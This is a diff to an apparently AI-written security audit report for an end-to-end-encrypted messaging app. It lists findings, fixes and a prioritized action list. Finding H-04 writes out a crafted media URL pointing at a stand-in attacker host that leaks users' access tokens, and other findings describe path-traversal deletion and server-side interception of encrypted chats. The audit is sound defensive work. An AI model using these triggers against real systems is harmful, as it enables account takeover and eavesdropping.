@@ -1,7 +1,9 @@
 # Fireplace — Security & Quality Audit · Findings Report
 
 **Branch:** `audit/full-review` · **Auditor:** Claude (Opus 4.8) · **Date:** 2026-06-14
-**Status:** IN PROGRESS — findings appended as chunks complete. Severity counts updated at end.
+**Status:** COMPLETE — full codebase audited (see `AUDIT-PROGRESS.md` coverage statement).
+**Totals:** 0 Critical · 4 High · 7 Medium · 14 Low · 4 Info. See SEVERITY TOTALS + PRIORITIZED
+ACTION LIST at the bottom.
 
 Severity = impact × exploitability. Confidence = how sure I am the code behaves as described
 (High = read + traced; Med = read, some runtime assumption; Low = needs runtime confirmation).
@@ -50,6 +52,65 @@ _(none yet)_
   `findByConversationForParticipant(conversationId, userId, …)` that adds the participant predicate
   to the SQL so it cannot be forgotten by future callers. Add a regression test that a non-member
   `getMessages` returns empty/`Unauthorized`.
+
+### H-04 · Access-token (JWT) exfiltration via attacker-controlled media URL
+- **Category:** Security — broken access control / credential disclosure (SSRF-adjacent)
+- **Confidence:** High (traced sender→envelope→render→header)
+- **Location:** `frontend/lib/services/api_service.dart:355-366` (`fetchMediaBytes`); source of
+  `mediaUrl` `frontend/lib/providers/messaging/messaging_provider.decrypt.dart:607-617`
+  (`parsed.mediaUrl` from the E2E envelope); callers
+  `widgets/message/image_message_content.dart:48-55`, `gif_message_content.dart:70`,
+  `file_message_content.dart:46-48`, `widgets/audio/playback_controller.dart:188-190,258-261`.
+- **Evidence:** `fetchMediaBytes(url, token)` attaches `Authorization: Bearer <token>` whenever
+  the resolved URL **contains the substring `/media/msgs/`** — it does **not** check that the host
+  equals the backend (`baseUrl`) origin. The `url` is `message.mediaUrl`, which on the receive
+  side is taken from the **decrypted E2E envelope** (`parsed.mediaUrl`), a value the **sender fully
+  controls and the server never validates** (server-side `MEDIA_URL_REGEX` only constrains the
+  separate DB field, not the envelope inside `encryptedContent`). The decrypt path validates
+  `linkPreviewImageUrl` for SSRF but **not `mediaUrl`**. `rewriteLoopbackMediaUrl` only rewrites
+  `localhost`/`127.0.0.1`, leaving foreign hosts untouched. The image widget auto-loads bytes on
+  display (`_loadDecryptedBytes` in init/`didUpdateWidget`).
+- **Trigger path:** Attacker (a friend) sends an `IMAGE`/`VOICE`/`FILE`/`GIF` message whose envelope
+  sets `mediaUrl = "https://attacker.example/media/msgs/x.bin"`. Victim opens the chat → the media
+  widget calls `fetchMediaBytes` → because the URL contains `/media/msgs/`, the victim's **access
+  JWT is sent in the `Authorization` header to `attacker.example`**, which logs it.
+- **Impact:** Full account takeover for the access-token lifetime (24h): the stolen JWT authorizes
+  REST + WebSocket (and per **M-05** keeps a live socket even after a password change). One of the
+  highest-impact findings — exploitable by any contact with no user interaction beyond opening a chat.
+- **Fix:** Only attach the `Authorization` header when the resolved URL's **origin equals
+  `baseUrl`'s origin** (parse both with `Uri` and compare scheme+host+port — not a substring).
+  Additionally, validate `parsed.mediaUrl` on decrypt the same way `linkPreviewImageUrl` is
+  validated (restrict to the backend origin or Cloudinary; reject anything else before it ever
+  reaches a fetch). Never send credentials cross-origin.
+
+### H-03 · No identity-key pinning / change-detection → server-assisted MITM defeats E2E
+- **Category:** Security — E2E / crypto integrity
+- **Confidence:** High (code), with explicit adversary caveat below
+- **Location:** `frontend/lib/services/encryption/signal_stores.dart:133-141`
+  (`isTrustedIdentity`); `frontend/lib/services/encryption_service.dart:158-162` (`buildSession`)
+- **Evidence:** `isTrustedIdentity()` is overridden to **always** `saveIdentity(address, key)` and
+  `return true` — regardless of whether a *different* identity was previously stored for that peer
+  (comment: "we don't verify fingerprints manually, so TOFU always wins"). `buildSession` also
+  pre-saves whatever `identityPublicKey` the server returns before `processPreKeyBundle`. So
+  libsignal's built-in trust-on-change protection is disabled and **any identity key the server
+  serves is accepted silently**, at first contact *and on every rebuild*. There is no
+  safety-number/QR verification flow and no "peer's security number changed" warning
+  (`getIdentityFingerprint` exists but is display-only — nothing compares peer fingerprints).
+- **Adversary / trigger:** The backend is the key directory (`fetchPreKeyBundle` returns the
+  identity). A malicious or compromised server (or anyone who can MITM that fetch) returns an
+  attacker-controlled identity + pre-key bundle for the target peer → the victim builds a session
+  with the attacker's keys and encrypts to the attacker. Forcing a rebuild
+  (`sessionRebuildNeeded`, also server-relayed) re-triggers this for an *existing* contact.
+- **Impact:** Defeats the product's central guarantee — confidentiality against the server. The
+  server can transparently MITM any conversation; users get no signal that it happened. (Caveat:
+  this is partly inherent to any server-directory E2E system, and a self-hosted operator is often
+  trusted; but the *complete absence* of pin-and-warn + verification is what makes it exploitable
+  with no detection.)
+- **Fix:** Implement TOFU pin-and-warn: in `isTrustedIdentity`, if a *different* key is already
+  stored for the address, return `false` (or surface a blocking "safety number changed" state) and
+  require explicit user re-acceptance — do not silently overwrite. Add a safety-number/fingerprint
+  comparison UI in Privacy & Safety (compare both peers' `getIdentityFingerprint`). Gate automatic
+  re-key acceptance behind that.
 
 ### H-02 · Path traversal → arbitrary file deletion via crafted `mediaUrl`
 - **Category:** Security — path traversal / data destruction
@@ -190,9 +251,66 @@ _(none yet)_
   `countUnread*`/`getUnreadSummary`) so DB-level `take/skip` works without over-fetch; restore an
   upper bound on `fetchLimit`.
 
+### M-07 · Production deploy runs the backend with `NODE_ENV=development`
+- **Category:** Security / data integrity — config
+- **Confidence:** High (compose config), Med (actual VM env not directly observed)
+- **Location:** `docker-compose.yml:38` (`NODE_ENV: development`); `docker-compose.web.yml:10-13`
+  (backend `extends` that service); `deploy.sh:40-45` (prod build/up uses these compose files;
+  no `NODE_ENV=production` exported; repo `.env` does not set it).
+- **Evidence:** The only backend service definition hardcodes `NODE_ENV: development`, and the web
+  compose extends it. `deploy.sh` runs `docker compose build/up backend` without overriding
+  `NODE_ENV`. So unless the VM carries an unversioned override, production runs in dev mode, which
+  flips several `process.env.NODE_ENV !== 'production'` gates **on** in prod:
+  `synchronize: true` (TypeORM auto-alters the live schema — see **M-03**, now concrete →
+  silent schema drift/data loss), the CORS dev-bypass that allows any `localhost`/`192.168.*`/`10.*`
+  origin (`main.ts:34-47`, `chat.gateway.ts:40-49`), verbose `debug`/`verbose` logging, and the
+  dev-secret fallbacks (`local-storage`/`media` dev `sendFile` path serving files directly instead
+  of via nginx `X-Accel-Redirect`).
+- **Impact:** Production schema auto-sync (data-loss risk on entity drift), looser CORS, verbose
+  logs (the `[push-skip]`/audit lines leak usernames + conversation graph at volume), and the dev
+  media-serve branch bypassing nginx's `internal` protection.
+- **Fix:** Set `NODE_ENV=production` for the deployed backend (compose env, `.env`, or a prod
+  override file) and verify via `/version` + a startup log. Adopt real TypeORM migrations and force
+  `synchronize: false` in prod regardless of `NODE_ENV`.
+
 ---
 
 ## LOW
+
+### L-11 · Backend container runs as root (amplifies H-02)
+- **Category:** Security — container hardening
+- **Confidence:** High
+- **Location:** `backend/Dockerfile` (no `USER` directive; `node:20-alpine` defaults to root)
+- **Evidence:** The production image never drops privileges, so `node dist/main.js` runs as UID 0.
+- **Impact:** Any file-write/delete primitive in the app (notably **H-02** path-traversal unlink)
+  executes as root inside the container — able to remove app code, `node_modules`, and the mounted
+  `media_storage` volume. Also general blast-radius increase for any RCE-class bug.
+- **Fix:** Add a non-root `USER node` (the alpine node image ships a `node` user) after copying
+  artifacts; ensure `MEDIA_DIR` is writable by that user.
+
+### L-12 · Web app served by nginx with no CSP / security headers
+- **Category:** Security — hardening
+- **Confidence:** High
+- **Location:** `frontend/nginx.conf` (static `location /` serves the SPA; no
+  `add_header Content-Security-Policy/X-Frame-Options/Referrer-Policy/...`)
+- **Evidence:** `helmet()` headers apply only to backend-proxied responses; the Flutter web bundle
+  and `index.html` are served directly by nginx with no CSP, `X-Frame-Options`, `Referrer-Policy`,
+  or `Permissions-Policy`.
+- **Impact:** No clickjacking protection (framing) and no CSP defense-in-depth for the PWA (which
+  handles E2E plaintext in the browser). Raises the impact of any future DOM-injection bug.
+- **Fix:** Add `X-Frame-Options: DENY` (or `frame-ancestors 'none'` via CSP), a tailored CSP, and
+  `Referrer-Policy: no-referrer` to the nginx server block; keep `X-Content-Type-Options: nosniff`.
+
+### L-13 · nginx `client_max_body_size 11m` contradicts the 20MB media limit
+- **Category:** Reliability / correctness
+- **Confidence:** High
+- **Location:** `frontend/nginx.conf:7`; vs `media.controller.ts:35` (21MB) and
+  `MediaCryptoService.maxBytes` (20MB)
+- **Evidence:** nginx caps request bodies at 11MB server-wide, so media uploads between ~11 and
+  20MB (which the app/backend explicitly allow) are rejected by nginx with `413` before reaching
+  the backend.
+- **Impact:** Larger voice/image/file sends silently fail in production behind nginx.
+- **Fix:** Raise `client_max_body_size` to match the backend cap (e.g. `22m`).
 
 ### L-08 · Several state-changing WS handlers have no per-event throttle
 - **Category:** Reliability / DoS
@@ -219,6 +337,36 @@ _(none yet)_
 - **Impact:** Minor — malformed client value yields a confusing failed send + unhandled rejection
   path. No data corruption (DB enum rejects bad values).
 - **Fix:** `@IsIn(['TEXT','PING','IMAGE','VOICE','GIF','FILE'])`; wrap `create` to emit a clean error.
+
+### L-14 · Auth tokens stored in plain SharedPreferences (localStorage on web; 365-day refresh)
+- **Category:** Security — token storage
+- **Confidence:** High
+- **Location:** `frontend/lib/providers/auth_provider.dart:84-86,145-147` (`jwt_token`,
+  `refresh_token` via `SharedPreferences`)
+- **Evidence:** Both the access JWT and the **365-day** refresh token (see M-01) are persisted in
+  `SharedPreferences` — which is `localStorage` on web (readable by any same-origin script) and
+  plaintext prefs on mobile (not the OS keystore; contrast the E2E keys' `DualStorage`/secure
+  storage). No httpOnly cookie is used.
+- **Impact:** With **L-12** (no CSP) any XSS/script-injection in the PWA exfiltrates a year-long
+  refresh token → durable account takeover. On a rooted/compromised device, mobile prefs are
+  readable too.
+- **Fix:** Store the refresh token in an httpOnly, Secure, SameSite cookie (or at least the mobile
+  OS keystore via `flutter_secure_storage`), shorten its TTL/add idle expiry (M-01), and add a CSP
+  (L-12) to shrink the XSS exfil surface.
+
+### L-10 · Signed pre-key (id 0) is generated once and never rotated
+- **Category:** Security — E2E / crypto hygiene
+- **Confidence:** High
+- **Location:** `frontend/lib/services/encryption_service.dart:86-88` (`_generateKeys`);
+  `signal_stores.dart:216-224` (only `signedPreKeyId=0` ever used)
+- **Evidence:** A single signed pre-key with `id=0` is created at install and reused indefinitely;
+  there is no periodic rotation (Signal rotates signed pre-keys ~weekly and retires the old one).
+  `loadSignedPreKeys` hardcodes `[loadSignedPreKey(0)]`.
+- **Impact:** Reduced forward secrecy — compromise of the long-lived signed-pre-key private key
+  exposes the X3DH shared secret for *all* sessions ever bootstrapped from it. Lower severity
+  because per-message keys still ratchet, but it widens the blast radius of a key-store compromise.
+- **Fix:** Rotate the signed pre-key on a schedule (new id, upload, keep the previous one briefly
+  for in-flight bundles), matching Signal's signed-pre-key lifecycle.
 
 ### L-01 · Hardcoded `DEV_JWT_SECRET` fallback in JWT strategy
 - **Category:** Security — secrets
@@ -330,12 +478,92 @@ _(none yet)_
 
 ---
 
-## STRENGTHS (running)
-- Global `ValidationPipe({ whitelist: true })` strips unknown DTO fields (`main.ts:23`).
-- `helmet()` security headers enabled (`main.ts:19`).
-- Refresh tokens stored only as SHA-256 hashes; opaque 48-byte random; rotated on use.
-- JWT invalidation on password change via `passwordChangedAt` vs `iat` (`jwt.strategy.ts:35-39`),
-  plus `revokeAllForUser` on reset.
-- E2E key **uploads** are strictly self-scoped (`client.data.user.id`); OTP claim is atomic raw SQL.
-- Per-endpoint throttling on all auth/sensitive routes; account-delete limited to 1/hour.
-- Avatar upload: mimetype filter + magic-byte validation + 5MB cap + memoryStorage.
+### I-03 · Dependency / supply-chain notes (static review — no live audit run)
+- Backend deps are modern: NestJS 11, `bcrypt@6`, `typeorm@0.3.28`, `multer@2.0.2` (the maintained
+  2.x line, not the vulnerable 1.x), `helmet@8`, `web-push@3.6.7`, `firebase-admin@13`,
+  `class-validator@0.14`. No obviously-abandoned or known-CVE packages spotted by version, but no
+  live `npm audit` was run in this pass — **CI does not run `npm audit` / `flutter pub outdated`**
+  (`.github/workflows/ci.yml`), so there is no automated dependency-vulnerability gate.
+- Frontend E2E relies on **`libsignal_protocol_dart@0.7.4`** — a community Dart re-implementation of
+  the Signal protocol (not the official library). The decrypt-regression history in CLAUDE.md traces
+  partly to its behavior; for a product whose security rests on it, this is a real assurance/
+  supply-chain consideration. Pin it, track upstream, and keep the two-party integration tests.
+- **Fix:** Add `npm audit --omit=dev` (fail on high) and a Dart advisory check to CI; periodically
+  review `flutter pub outdated`.
+
+### I-04 · `_decryptedContentCache` (in-RAM) is unbounded per session
+- `frontend/lib/providers/encryption_provider.dart:29` — grows one `MessageModel` per decrypted id
+  for the session lifetime (the *persisted* cache is capped at 2000, this RAM map is not). Cleared
+  on logout/fresh-connect. Minor memory growth in very long sessions.
+
+## SEVERITY TOTALS
+| Severity | Count | IDs |
+|---|---|---|
+| Critical | 0 | — |
+| High | 4 | H-01 H-02 H-03 H-04 |
+| Medium | 7 | M-01 … M-07 |
+| Low | 14 | L-01 … L-14 |
+| Info | 4 | I-01 … I-04 |
+
+---
+
+## PRIORITIZED ACTION LIST (highest first)
+
+1. **H-04 — JWT exfil via media URL.** Gate the `Authorization` header in `fetchMediaBytes` on
+   exact origin match with `baseUrl`, and validate `parsed.mediaUrl` on decrypt. *Highest impact
+   (account takeover by any contact), smallest fix.* → also a **quick win**.
+2. **H-01 — getMessages IDOR.** Add the participant check to `handleGetMessages`/`findByConversation`.
+   *Mass cross-account metadata exposure; one membership check.* → **quick win.**
+3. **H-02 — mediaUrl path-traversal file delete.** Anchor `MEDIA_URL_REGEX` to a strict filename
+   shape **and** reject `..`/escape in `extractPublicId`→`deleteFile`. → mostly a **quick win**.
+4. **M-07 / M-03 — production runs in dev mode.** Set `NODE_ENV=production` on the deployed backend
+   and force `synchronize:false`; verify via `/version`. *Prevents prod schema auto-sync data loss +
+   CORS dev-bypass.* → **quick win** (one env var) + follow-up (migrations).
+5. **H-03 — E2E identity pinning.** Implement TOFU pin-and-warn + a safety-number verification UI.
+   *Larger UX change; closes the server-MITM hole.*
+6. **M-05 — WS skips pwChangedAt.** Mirror the REST `iat <= passwordChangedAt` check in
+   `handleConnection`; disconnect live sockets on password reset. → **quick win.**
+7. **M-04 — link-preview SSRF.** Resolve-and-pin + binary private-range check on every hop. (Also
+   re-evaluate whether server-side preview is needed at all given E2E.)
+8. **M-01 — refresh-token rotation race / no reuse detection.** Atomic `DELETE … RETURNING` +
+   reuse-triggered family revoke; shorten the 365-day TTL.
+9. **M-02 — unscoped fcm-token delete.** Scope to `req.user.id` (mirror web-push). → **quick win.**
+10. **L-11 / L-12 / L-13 — infra hardening.** Non-root container `USER`; nginx CSP + `X-Frame-Options`;
+    raise `client_max_body_size` to 22m. → all **quick wins**.
+11. **L-14 — token storage.** Move the refresh token to httpOnly cookie / OS keystore.
+12. **M-06 / L-08 / L-09 / L-10 / L-04 / L-05 / L-06 / I-03** — correctness/hardening backlog
+    (SQL-side pagination, throttle the unthrottled WS handlers, `@IsIn` messageType, signed-prekey
+    rotation, purge secret_notes on delete, prekey-depletion cap, rebuild-relay gating, add CI
+    `npm audit`).
+
+**Quick wins (small, high-value, low-risk):** H-01, H-02, H-04, M-02, M-05, M-07 (env var),
+L-11, L-12, L-13, L-09. Several are one-to-few-line changes with outsized impact.
+
+---
+
+## STRENGTHS (looked-good)
+- **E2E failure handling is genuinely careful.** `decideDecryptionFailure`
+  (`decryption_failure_policy.dart`) is a pure, characterization-tested state machine; the inbound
+  decrypt-failure path **never deletes a Signal session** (rebuild-request only), and
+  `ensureSession` builds *over* the record (archives, not deletes) — exactly the lossless behavior
+  libsignal needs. This is hard-won and correct.
+- **Push is metadata-only.** No message text or keys ever leave the device via FCM/Web Push; the
+  web-push body is VAPID-encrypted end-to-end to the subscription. Push-skip decisions are server-
+  side with a freshness guard.
+- **No plaintext / keys / tokens are logged anywhere** (verified repo-wide). Diagnostics carry ids,
+  booleans, types, and lengths only.
+- **WS authZ is consistent** — every state-changing handler verifies conversation membership /
+  ownership (delivered, read, clear, delete, pin, disappearing, reactions, friend accept/reject,
+  block) *except* the one `getMessages` gap (H-01), which makes that omission clearly a bug.
+- **Media crypto is sound:** AES-256-GCM with a fresh random 32-byte key + 12-byte IV per blob,
+  20MB cap, done off the UI path.
+- **Solid web hygiene:** Flutter canvas rendering (no DOM XSS surface); the only HTML (secret-note
+  landing page, service worker) treats untrusted strings as text; links are restricted to `https?://`.
+- **Input validation everywhere:** global `ValidationPipe({whitelist:true})` (REST) + per-event
+  `validateDto` (WS); `helmet()`; per-route throttling; account-delete 1/hour; avatar magic-byte +
+  mimetype + size checks; atomic OTP claim and atomic secret-note read-once via `… RETURNING`.
+- **Refresh tokens** stored only as SHA-256 hashes (opaque 48-byte random), rotated on use; password
+  change invalidates access tokens (REST) and revokes all refresh tokens.
+- **SSRF is partially defended** (manual redirect following with per-hop re-validation; the gap is
+  the IP-encoding/DNS-rebind layer, M-04) and the link-preview image URL is re-validated again on
+  the client before render — defense in depth.
